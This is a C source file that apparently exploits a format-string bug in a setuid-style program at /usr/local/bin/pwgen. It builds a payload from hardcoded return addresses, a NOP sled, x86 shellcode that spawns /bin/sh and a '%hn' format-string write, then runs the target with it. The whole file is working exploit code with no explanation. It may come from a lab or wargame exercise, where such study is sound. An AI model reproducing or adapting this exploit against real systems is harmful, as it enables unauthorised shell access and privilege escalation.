#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define NOP                               0x90

#define TARGET                          "/usr/local/bin/pwgen"

#define EIP                             " \xfc\xdb\xbf\xff\xfe\xdb\xbf\xff"
#define FORMAT                          "%55611x%8$hn%9783x%9$hn"

#define NOPS_X16 "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

#define SHELLCODE "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

int main(int argc, char *argv[]) {

    char *args[3];
    char *env[1];

    args[0] =
        EIP
        NOPS_X16
        SHELLCODE
        FORMAT
        ;
    
    //args[0] = TARGET;

    args[1] = "-h";

    args[2] = NULL;

    env[0] = NULL;

    
    //printf("payload:--------------\n");
    //printf("Usage: %s [options]",args[0]);
    //printf("\n----------------------\n");
    

    return execve(TARGET, args, env);

    //return 0;
}
